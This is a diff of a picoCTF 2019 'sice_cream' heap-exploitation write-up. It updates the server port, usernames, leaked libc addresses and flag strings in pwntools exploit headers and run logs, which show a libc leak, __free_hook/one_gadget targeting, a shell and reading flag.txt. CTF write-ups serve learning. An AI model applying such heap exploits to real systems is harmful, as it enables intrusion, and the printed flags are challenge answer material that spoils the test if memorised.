@@ -67,7 +67,7 @@ context.arch = 'amd64'
 context.terminal = ['tmux', 'new-window']
 
 BINARY = './sice_cream'
-HOST, PORT = '2019shell1.picoctf.com', 6552
+HOST, PORT = '2019shell1.picoctf.com', 38495
 
 elf = ELF(BINARY)
 libc = ELF('./libc.so.6')
@@ -445,7 +445,7 @@ context.arch = 'amd64'
 context.terminal = ['tmux', 'new-window']
 
 BINARY = './sice_cream'
-HOST, PORT = '2019shell1.picoctf.com', 6552
+HOST, PORT = '2019shell1.picoctf.com', 38495
 
 elf = ELF(BINARY)
 libc = ELF('./libc.so.6')
@@ -665,27 +665,26 @@ free(11)
 p.interactive()
 ```
 ```sh
-Faith@pico-2019-shell1:~$ ./sice_cream.py REMOTE
-[*] '/home/Faith/sice_cream'
+redacted@pico-2019-shell1:~$ python2 exploit.py REMOTE
+[*] '/home/warlock/sice_cream'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x3ff000)
     RUNPATH:  './'
-[*] '/home/Faith/libc.so.6'
+[*] '/home/warlock/libc.so.6'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[+] Opening connection to 2019shell1.picoctf.com on port 6552: Done
-[*] Leak: 0x7f451eb51b78
-[*] main arena: 0x7f451eb51b20
-[*] Libc base: 0x7f451e78d000
-[*] system: 0x7f451e7d2390
-[*] __free_hook: 0x7f451eb537a8
-[*] fake_chunk_top: 0x7f451eb51b2a
+[+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
+[*] Leak: 0x7f1df256eb78
+[*] main arena: 0x7f1df256eb20
+[*] Libc base: 0x7f1df21aa000
+[*] system: 0x7f1df21ef390
+[*] __free_hook: 0x7f1df25707a8
 [*] Switching to interactive mode
 $ ls
 flag.txt
@@ -694,7 +693,7 @@ libc.so.6
 sice_cream
 xinet_startup.sh
 $ cat flag.txt
-flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_148c832c}$
+flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349}$
 ```
 
 ### **Other Exploit**
@@ -709,7 +708,7 @@ context.arch = 'amd64'
 context.terminal = ['tmux', 'new-window']
 
 BINARY = './sice_cream'
-HOST, PORT = '2019shell1.picoctf.com', 6552
+HOST, PORT = '2019shell1.picoctf.com', 38495
 
 elf = ELF(BINARY)
 libc = ELF('./libc.so.6')
@@ -872,7 +871,7 @@ p.interactive()
 
 ```
 ```sh
-vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ ./exploit2.py REMOTE
+vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ ./exploit.py REMOTE
 [*] '/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/sice_cream'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -886,16 +885,16 @@ vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ ./expl
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[+] Opening connection to 2019shell1.picoctf.com on port 6552: Done
-[*] Leak: 0x7f6d15d9db78
-[*] main arena: 0x7f6d15d9db20
-[*] Libc base: 0x7f6d159d9000
-[*] system: 0x7f6d15a1e390
-[*] __free_hook: 0x7f6d15d9f7a8
-[*] __malloc_hook: 0x7f6d15d9db10
-[*] one_gadget: 0x7f6d15ac92a4
+[+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
+[*] Leak: 0x7f61ebcbdb78
+[*] main arena: 0x7f61ebcbdb20
+[*] Libc base: 0x7f61eb8f9000
+[*] system: 0x7f61eb93e390
+[*] __free_hook: 0x7f61ebcbf7a8
+[*] __malloc_hook: 0x7f61ebcbdb10
+[*] one_gadget: 0x7f61eb9e92a4
 [*] Switching to interactive mode
-*** Error in `/problems/sice-cream_2_fc6c2a415935e4010e4e221e6d965a34/sice_cream': double free or corruption (fasttop): 0x00000000022db010 ***
+*** Error in `/problems/sice-cream_4_7ef8903b2c31d9f08c4ad7bcdcb5f0d3/sice_cream': double free or corruption (fasttop): 0x0000000001500010 ***
 $ ls
 flag.txt
 ld-2.23.so
@@ -903,5 +902,5 @@ libc.so.6
 sice_cream
 xinet_startup.sh
 $ cat flag.txt
-flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_148c832c} $
+flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349}$  
 ```
